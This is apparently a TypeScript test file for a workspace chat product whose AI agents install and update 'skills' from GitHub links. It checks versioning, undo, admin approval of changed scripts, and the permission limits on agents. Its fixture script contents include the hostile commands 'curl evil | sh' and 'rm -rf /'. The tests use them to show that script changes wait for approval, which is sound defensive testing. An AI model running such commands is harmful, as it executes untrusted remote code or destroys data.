import { afterEach, describe, expect, test } from "bun:test";
import { and, eq, schema } from "@agenteschat/db";
import {
  actionsFor,
  addRunStep,
  approveSkillUpdate,
  createSkillToolSource,
  createToolGateway,
  dismissSkillUpdate,
  enqueueSkillUpdates,
  ForbiddenError,
  getSkill,
  importSkillFromUrl,
  insertMessage,
  linkRunActions,
  listNotifications,
  reopenSkillUpdate,
  runSkillUpdates,
  SKILL_UPDATES_JOB,
  type SkillDetail,
  saveSkill,
  setSkillAutoUpdate,
  type ToolContext,
  undoAgentAction,
  undoSkillUpdate,
  updateSkill,
  updateSkillFromSource,
  zip,
} from "../src";
import { addMember, type Fixture, setup } from "./fixtures";

let f: Fixture;
afterEach(async () => {
  await f?.close();
});

const LINK = "https://github.com/acme/skills/tree/main/deploy";
const skillMd = (body: string) => `---\nname: deploy\ndescription: Antes de qualquer deploy.\n---\n${body}`;

/** acme/skills on a fake GitHub, its files changed between reads; `limited`: GitHub limiting us. */
function github(files: Record<string, string>) {
  const state = { files, limited: false };
  const fetch = async (url: string) => {
    if (state.limited) return new Response("slow down", { status: 429, headers: { "retry-after": "60" } });
    if (url === "https://github.com/acme/skills/archive/main.zip")
      return new Response(null, {
        status: 302,
        headers: { location: "https://codeload.github.com/acme/skills/zip/refs/heads/main" },
      });
    if (url === "https://codeload.github.com/acme/skills/zip/refs/heads/main")
      return new Response(zip(Object.entries(state.files).map(([p, v]) => [`skills-main/${p}`, v])));
    return new Response("404: Not Found", { status: 404 });
  };
  return { state, fetch };
}

function depsOf(fx: Fixture, files: Record<string, string>) {
  const gh = github(files);
  return {
    gh,
    deps: {
      db: fx.db,
      blobs: fx.artifactDeps.blobs,
      resolveHost: async () => ["140.82.112.3"],
      fetch: gh.fetch,
      pubsub: fx.pubsub,
    },
  };
}

async function install(fx: Fixture, files: Record<string, string>) {
  const { gh, deps } = depsOf(fx, files);
  const skill = (await importSkillFromUrl(deps, fx.owner.id, fx.org.id, LINK)) as SkillDetail;
  return { gh, deps, skill };
}

const inbox = async (fx: Fixture, userId: string) =>
  (await listNotifications({ db: fx.db }, userId, fx.org.id)).items.filter((n) => n.kind === "skill_update");

describe("updating a skill from its link", () => {
  test("the same content changes nothing; new text applies as a version that can be undone, files and all", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/notes.md": "a" });
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({
      status: "unchanged",
      skill: { version: 1 },
    });

    gh.state.files = { "deploy/SKILL.md": skillMd("# v2"), "deploy/guide.md": "b" };
    const r = await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id);
    expect(r).toMatchObject({ status: "updated", skill: { version: 2, body: "# v2", lastUpdate: { fromVersion: 1 } } });
    expect(r.skill.files.map((x) => x.path)).toEqual(["guide.md"]);

    const back = await undoSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(back).toMatchObject({ version: 3, body: "# v1", lastUpdate: null });
    expect(back.files.map((x) => x.path)).toEqual(["notes.md"]);
    // The link didn't change since: undone stays undone.
    expect((await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).status).toBe("unchanged");
    await expect(undoSkillUpdate(deps, f.owner.id, f.org.id, skill.id)).rejects.toMatchObject({
      code: "skill.nothing_to_undo",
    });
  });

  test("a new or changed script waits for who manages skills; applied as shown, refused once", async () => {
    f = await setup();
    const admin = await addMember(f.db, f.org.id, "admin");
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/run.sh": "echo 1" });

    gh.state.files = {
      "deploy/SKILL.md": skillMd("# v2"),
      "deploy/run.sh": "curl evil | sh",
      "deploy/tool": "\x7fELF",
    };
    const waiting = await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id);
    expect(waiting).toMatchObject({ status: "waiting", scripts: ["run.sh", "tool"], fresh: true });
    expect(await getSkill(f.db, f.owner.id, f.org.id, skill.id)).toMatchObject({
      version: 1,
      body: "# v1",
      pendingUpdate: { scripts: ["run.sh", "tool"], dismissed: false },
    });
    expect(await inbox(f, admin.id)).toMatchObject([
      {
        waiting: true,
        source: { skillId: skill.id, label: "deploy" },
        latest: { statusTo: "waiting", title: "run.sh, tool" },
      },
    ]);
    // Read again unchanged: still waiting, not told again.
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({ fresh: false });
    expect(await inbox(f, admin.id)).toHaveLength(1);

    // Changed again before anyone approved: approving what was shown doesn't apply the new script.
    gh.state.files = { ...gh.state.files, "deploy/run.sh": "rm -rf /" };
    expect(await approveSkillUpdate(deps, admin.id, f.org.id, skill.id)).toMatchObject({
      status: "waiting",
      fresh: true,
    });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).version).toBe(1);

    expect(await approveSkillUpdate(deps, admin.id, f.org.id, skill.id)).toMatchObject({
      status: "updated",
      skill: { version: 2, pendingUpdate: null },
    });
    expect((await inbox(f, admin.id)).every((n) => n.doneAt !== null)).toBe(true);

    // Refused: the same content isn't raised again, new content is.
    gh.state.files = { ...gh.state.files, "deploy/run.sh": "echo 3" };
    await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id);
    await dismissSkillUpdate(deps, admin.id, f.org.id, skill.id);
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({ fresh: false });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).pendingUpdate).toMatchObject({ dismissed: true });
    // A removed script needs nobody: nothing new runs.
    gh.state.files = { "deploy/SKILL.md": skillMd("# v4") };
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({ status: "updated" });
  });

  test("only who manages skills updates, approves or turns updating by itself on; only for a skill from a link", async () => {
    f = await setup();
    const member = await addMember(f.db, f.org.id, "member");
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/run.py": "1" });
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2"), "deploy/run.py": "2" };
    await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id);
    for (const call of [updateSkillFromSource, approveSkillUpdate, dismissSkillUpdate, undoSkillUpdate])
      await expect(call(deps, member.id, f.org.id, skill.id)).rejects.toBeInstanceOf(ForbiddenError);
    await expect(setSkillAutoUpdate(f.db, member.id, f.org.id, skill.id, true)).rejects.toBeInstanceOf(ForbiddenError);
    const written = await saveSkill(deps, f.owner.id, f.org.id, {
      name: "escrita",
      description: "À mão.",
      body: "x",
      metadata: {},
      source: "manual",
    });
    await expect(setSkillAutoUpdate(f.db, f.owner.id, f.org.id, written.id, true)).rejects.toMatchObject({
      code: "skill.no_link",
    });
  });
});

describe("updating by itself, every day", () => {
  test("queued once a day per workspace; applied and told, a script waits, a refusal told once, GitHub limiting us never", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1") });
    expect(await enqueueSkillUpdates(f.db)).toBe(0);
    expect(await setSkillAutoUpdate(f.db, f.owner.id, f.org.id, skill.id, true)).toMatchObject({ autoUpdate: true });
    const now = new Date("2026-11-03T10:00:00Z");
    expect(await enqueueSkillUpdates(f.db, now)).toBe(1);
    await enqueueSkillUpdates(f.db, new Date("2026-11-03T11:00:00Z"));
    const jobs = await f.db.select().from(schema.outbox).where(eq(schema.outbox.kind, SKILL_UPDATES_JOB));
    expect(jobs).toHaveLength(1);
    expect(jobs[0]?.nextAttemptAt.getTime()).toBeGreaterThanOrEqual(now.getTime());

    gh.state.files = { "deploy/SKILL.md": skillMd("# v2") };
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 1, waiting: 0, failed: 0 });
    // Who turned it on is told (an update they didn't do themselves this time).
    expect((await inbox(f, f.owner.id)).map((n) => n.latest.statusTo)).toEqual(["updated"]);

    gh.state.files = { "deploy/other.md": "no skill here" };
    await runSkillUpdates(deps, f.org.id);
    await runSkillUpdates(deps, f.org.id);
    const failed = (await inbox(f, f.owner.id)).filter((n) => n.latest.statusTo === "failed");
    expect(failed).toMatchObject([{ latest: { reason: "skill.no_skill_md" } }]);
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).updateError).toBe("skill.no_skill_md");

    gh.state.limited = true;
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 0, failed: 0 });
    gh.state.limited = false;
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2"), "deploy/x.js": "1" };
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 1, failed: 0 });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).updateError).toBeNull();
  });

  test("a workspace being deleted keeps its skills as they are and tells nobody", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1") });
    await setSkillAutoUpdate(f.db, f.owner.id, f.org.id, skill.id, true);
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2") };
    await f.db
      .update(schema.organizations)
      .set({ deletionDueAt: new Date(Date.now() + 7 * 86_400_000) })
      .where(eq(schema.organizations.id, f.org.id));
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 0, failed: 0 });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).version).toBe(skill.version);
    expect(await inbox(f, f.owner.id)).toEqual([]);
  });
});

describe("edge cases of updating from a link", () => {
  test("installed before links kept their hash: a same-size script change still waits", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/run.sh": "echo 1" });
    await f.db.update(schema.skills).set({ sourceHash: null }).where(eq(schema.skills.id, skill.id));
    gh.state.files = { "deploy/SKILL.md": skillMd("# v1"), "deploy/run.sh": "echo 2" };
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({
      status: "waiting",
      scripts: ["run.sh"],
    });
  });

  test("a refusal reaches who manages skills too; an edit by hand stops the daily update", async () => {
    f = await setup();
    const admin = await addMember(f.db, f.org.id, "admin");
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1") });
    await setSkillAutoUpdate(f.db, admin.id, f.org.id, skill.id, true);
    await f.db
      .delete(schema.organizationMembers)
      .where(and(eq(schema.organizationMembers.orgId, f.org.id), eq(schema.organizationMembers.userId, admin.id)));
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2") };
    expect(await runSkillUpdates(deps, f.org.id)).toMatchObject({ failed: 1 });
    expect((await inbox(f, f.owner.id)).map((n) => n.latest)).toMatchObject([
      { statusTo: "failed", reason: "forbidden" },
    ]);

    await updateSkill(deps, f.owner.id, f.org.id, skill.id, { body: "# mine" });
    expect(await enqueueSkillUpdates(f.db, new Date("2026-11-04T10:00:00Z"))).toBe(0);
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 0, failed: 0 });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).body).toBe("# mine");
  });
});

describe("an agent's change and its link's next update", () => {
  test("an update that would replace what agents changed waits for a person; the same link keeps their change", async () => {
    f = await setup();
    const admin = await addMember(f.db, f.org.id, "admin");
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/notes.md": "a" });
    await setSkillAutoUpdate(f.db, f.owner.id, f.org.id, skill.id, true);
    await f.db.insert(schema.agentSkills).values({ orgId: f.org.id, agentId: f.agent.id, skillId: skill.id });
    const ctx = await runFor(f, f.owner.id);
    const run = { id: ctx.runId as string, orgId: f.org.id };
    await addRunStep(f.db, run, "tool_call", { toolUseId: "tu_load", name: "load_skill", input: { name: "deploy" } });
    await addRunStep(f.db, run, "tool_result", { toolUseId: "tu_load", name: "load_skill", content: "ok" });
    expect((await call(deps, ctx, "update_skill", { name: "deploy", body: "# v1\nWarm the cache." })).content).toBe(
      "Updated deploy (v2).",
    );

    // Its link the same: the agent's change stays.
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 0, failed: 0 });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).body).toBe("# v1\nWarm the cache.");

    // Its link changed: the update waits, told to who manages skills as replacing the agents' change.
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2"), "deploy/notes.md": "a" };
    expect(await runSkillUpdates(deps, f.org.id)).toEqual({ updated: 0, waiting: 1, failed: 0 });
    expect(await getSkill(f.db, f.owner.id, f.org.id, skill.id)).toMatchObject({
      version: 2,
      body: "# v1\nWarm the cache.",
      pendingUpdate: { scripts: [], edited: true, dismissed: false },
    });
    expect((await inbox(f, admin.id)).map((n) => n.latest)).toMatchObject([{ statusTo: "waiting", reason: "edited" }]);

    // Applied by a person: the link's version, with Desfazer back to the agent's.
    expect((await approveSkillUpdate(deps, f.owner.id, f.org.id, skill.id)).status).toBe("updated");
    const updated = await getSkill(f.db, f.owner.id, f.org.id, skill.id);
    expect([updated.body, updated.pendingUpdate]).toEqual(["# v2", null]);
    gh.state.files = { "deploy/SKILL.md": skillMd("# v3"), "deploy/notes.md": "a" };
    expect(await runSkillUpdates(deps, f.org.id)).toMatchObject({ updated: 1 });
    const back = await undoSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(back.body).toBe("# v2");
  });

  test("the waiting update shows both sides and who changed what; either choice has Desfazer", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1"), "deploy/run.sh": "echo 1" });
    await f.db.insert(schema.agentSkills).values({ orgId: f.org.id, agentId: f.agent.id, skillId: skill.id });
    const ctx = await runFor(f, f.owner.id);
    const run = { id: ctx.runId as string, orgId: f.org.id };
    await addRunStep(f.db, run, "tool_call", { toolUseId: "tu_load", name: "load_skill", input: { name: "deploy" } });
    await addRunStep(f.db, run, "tool_result", { toolUseId: "tu_load", name: "load_skill", content: "ok" });
    await call(deps, ctx, "update_skill", { name: "deploy", body: "# v1\nWarm the cache." });
    await call(deps, ctx, "update_skill", { name: "deploy", body: "# v1\nWarm the cache first." });

    gh.state.files = { "deploy/SKILL.md": skillMd("# v2"), "deploy/run.sh": "echo 2" };
    expect((await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).status).toBe("waiting");
    const waiting = await getSkill(f.db, f.owner.id, f.org.id, skill.id);
    expect(waiting.pending).toEqual({
      body: "# v2",
      description: "Antes de qualquer deploy.",
      // What its link last wrote, kept at the agents' first change, not their second.
      base: { body: "# v1", description: "Antes de qualquer deploy.", at: expect.any(String) },
      files: [{ path: "run.sh", before: "echo 1", after: "echo 2", large: false }],
    });
    expect(waiting.changes.map((c) => [c.agentId, c.before, c.after, c.undone])).toEqual([
      [f.agent.id, "# v1\nWarm the cache.", "# v1\nWarm the cache first.", false],
      [f.agent.id, "# v1", "# v1\nWarm the cache.", false],
    ]);

    // Manter a dos agentes, then Desfazer: it waits again, as it was.
    const kept = await dismissSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(kept.pendingUpdate).toMatchObject({ dismissed: true, dismissedAt: expect.any(String) });
    const reopened = await reopenSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(reopened.pendingUpdate).toMatchObject({ dismissed: false, dismissedAt: null, edited: true });
    expect(reopened.pending?.body).toBe("# v2");
    await expect(reopenSkillUpdate(deps, f.owner.id, f.org.id, skill.id)).rejects.toMatchObject({
      code: "skill.no_dismissed_update",
    });

    // Usar a versão do link, then Desfazer: the agents' version and the same choice, waiting again.
    const used = await approveSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(used.skill).toMatchObject({
      body: "# v2",
      pendingUpdate: null,
      lastUpdate: { waited: true },
      pending: null,
    });
    const back = await undoSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(back).toMatchObject({
      body: "# v1\nWarm the cache first.",
      pendingUpdate: { dismissed: false, edited: true, scripts: ["run.sh"] },
      pending: { body: "# v2", base: { body: "# v1" } },
      lastUpdate: null,
    });
    // Read again, the link the same: still waiting, not applied.
    expect(await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).toMatchObject({
      status: "waiting",
      fresh: false,
    });
    // Chosen this time: the link's version, and its text is the base no more.
    expect((await approveSkillUpdate(deps, f.owner.id, f.org.id, skill.id)).skill.body).toBe("# v2");
    const [row] = await f.db.select().from(schema.skills).where(eq(schema.skills.id, skill.id));
    expect([row?.linkBase, row?.editedSinceSource]).toEqual([null, false]);
  });

  test("Desfazer mudança on the agents' only change: undone in its history, and the link's next update needs nobody", async () => {
    f = await setup();
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1") });
    await f.db.insert(schema.agentSkills).values({ orgId: f.org.id, agentId: f.agent.id, skillId: skill.id });
    const ctx = await runFor(f, f.owner.id);
    const run = { id: ctx.runId as string, orgId: f.org.id };
    await addRunStep(f.db, run, "tool_call", { toolUseId: "tu_load", name: "load_skill", input: { name: "deploy" } });
    await addRunStep(f.db, run, "tool_result", { toolUseId: "tu_load", name: "load_skill", content: "ok" });
    await call(deps, ctx, "update_skill", { name: "deploy", body: "# v1\nWarm the cache." });

    const back = await undoSkillUpdate(deps, f.owner.id, f.org.id, skill.id);
    expect(back.body).toBe("# v1");
    expect(back.changes.map((c) => c.undone)).toEqual([true]);
    const [row] = await f.db.select().from(schema.skills).where(eq(schema.skills.id, skill.id));
    expect([row?.linkBase, row?.editedSinceSource]).toEqual([null, false]);
    gh.state.files = { "deploy/SKILL.md": skillMd("# v2") };
    expect((await updateSkillFromSource(deps, f.owner.id, f.org.id, skill.id)).status).toBe("updated");
  });
});

/** A run of the agent on `userId`'s message in #general. */
async function runFor(fx: Fixture, userId: string): Promise<ToolContext> {
  const trigger = await insertMessage(fx.db, {
    orgId: fx.org.id,
    channelId: fx.general.id,
    author: { type: "person", userId },
    body: "instala essa skill",
  });
  const [run] = await fx.db
    .insert(schema.agentRuns)
    .values({
      orgId: fx.org.id,
      agentId: fx.agent.id,
      channelId: fx.general.id,
      threadRootId: trigger.id,
      triggerMessageId: trigger.id,
      trigger: "mention",
      hop: 1,
      status: "running",
    })
    .returning();
  if (!run) throw new Error("no run");
  return {
    db: fx.db,
    orgId: fx.org.id,
    agentId: fx.agent.id,
    runId: run.id,
    channelId: fx.general.id,
    threadRootId: trigger.id,
    triggerMessageId: trigger.id,
  };
}

async function call(
  deps: ReturnType<typeof depsOf>["deps"],
  ctx: ToolContext,
  name: string,
  input: Record<string, unknown>,
) {
  const gateway = createToolGateway({ sources: [createSkillToolSource(deps)] });
  const res = await gateway.invoke(ctx, { toolUseId: `tu_${crypto.randomUUID()}`, name, input });
  if (res.type !== "result") throw new Error(`not a result: ${res.type}`);
  return res.output;
}

const cardsOf = async (fx: Fixture) =>
  (await fx.db.select().from(schema.messages).where(eq(schema.messages.orgId, fx.org.id))).filter(
    (m) => m.meta.actionCard,
  );

describe("agents installing and updating skills", () => {
  test("offer_install_skill posts the install card for who may confirm; only GitHub links, never one installed", async () => {
    f = await setup();
    const member = await addMember(f.db, f.org.id, "member");
    const { deps } = depsOf(f, { "deploy/SKILL.md": skillMd("# v1") });
    const ctx = await runFor(f, member.id);
    const bad = await call(deps, ctx, "offer_install_skill", { url: "https://gitlab.com/acme/skills", why: "Deploys" });
    expect(bad).toMatchObject({ isError: true });
    const out = await call(deps, ctx, "offer_install_skill", { url: LINK, why: "Faz deploys" });
    expect(out.content).toContain("someone who manages agents here does it from the card");
    expect((await cardsOf(f)).map((m) => [m.meta.bodyCode, m.meta.actionCard])).toEqual([
      [
        "action_install_skill",
        { kind: "install_skill", forUserId: member.id, params: { url: LINK, why: "Faz deploys" } },
      ],
    ]);
    // Nothing installed by the card itself.
    expect(await f.db.select().from(schema.skills).where(eq(schema.skills.orgId, f.org.id))).toHaveLength(0);

    await importSkillFromUrl(deps, f.owner.id, f.org.id, LINK);
    const again = await call(deps, await runFor(f, f.owner.id), "offer_install_skill", { url: LINK, why: "x" });
    expect(again.content).toContain("already installed as the skill deploy");
    // Installed but off for this agent: it asks on its own settings card, never another install card.
    expect(again.content).toContain("not on for you: ask for it with request_settings_change");
    const load = await call(deps, await runFor(f, f.owner.id), "load_skill", { name: "deploy" });
    expect(load).toMatchObject({ isError: true });
    expect(load.content).toContain("The skill deploy is installed here but not on for you: ask for it with");
    expect(await cardsOf(f)).toHaveLength(1);
  });

  test("update_skill_from_source: text applies with Undo, a script waits on a card, and who can't gets a card for who can", async () => {
    f = await setup();
    const member = await addMember(f.db, f.org.id, "member");
    const { gh, deps, skill } = await install(f, { "deploy/SKILL.md": skillMd("# v1") });

    gh.state.files = { "deploy/SKILL.md": skillMd("# v2") };
    const asMember = await call(deps, await runFor(f, member.id), "update_skill_from_source", { name: "all" });
    expect(asMember.content).toContain("can't update skills");
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).version).toBe(1);
    expect((await cardsOf(f)).map((m) => m.meta.actionCard)).toEqual([
      { kind: "update_skills", forUserId: member.id, params: { skillIds: [skill.id], why: "" } },
    ]);

    const ctx = await runFor(f, f.owner.id);
    const out = await call(deps, ctx, "update_skill_from_source", { name: "deploy" });
    expect(out.content).toBe("deploy: updated to v2.");
    const reply = await insertMessage(f.db, {
      orgId: f.org.id,
      channelId: f.general.id,
      author: { type: "agent", agentId: f.agent.id, runId: ctx.runId, hop: 1 },
      body: "Atualizei.",
    });
    await linkRunActions(f.db, f.org.id, ctx.runId ?? "", reply.id);
    const [receipt] = (await actionsFor(f.db, f.org.id, [reply.id])).get(reply.id) ?? [];
    expect(receipt).toMatchObject({ kind: "skill.updated", target: { type: "skill", id: skill.id } });
    await undoAgentAction({ db: f.db, pubsub: f.pubsub }, f.owner.id, f.org.id, receipt?.id ?? "");
    expect(await getSkill(f.db, f.owner.id, f.org.id, skill.id)).toMatchObject({ version: 3, body: "# v1" });

    gh.state.files = { "deploy/SKILL.md": skillMd("# v4"), "deploy/run.sh": "echo" };
    const scripted = await call(deps, await runFor(f, f.owner.id), "update_skill_from_source", {
      name: "deploy",
      why: "Novo script",
    });
    expect(scripted.content).toContain("deploy: the update adds or changes run.sh, so it waits for approval.");
    const [, card] = await cardsOf(f);
    expect(card?.meta).toMatchObject({
      bodyCode: "action_update_skills",
      actionCard: { kind: "update_skills", params: { skillIds: [skill.id], why: "Novo script" } },
    });
    expect((await getSkill(f.db, f.owner.id, f.org.id, skill.id)).version).toBe(3);
    const [row] = await f.db
      .select({ pending: schema.skills.pendingUpdate })
      .from(schema.skills)
      .where(and(eq(schema.skills.id, skill.id)));
    expect(row?.pending?.scripts).toEqual(["run.sh"]);
  });
});
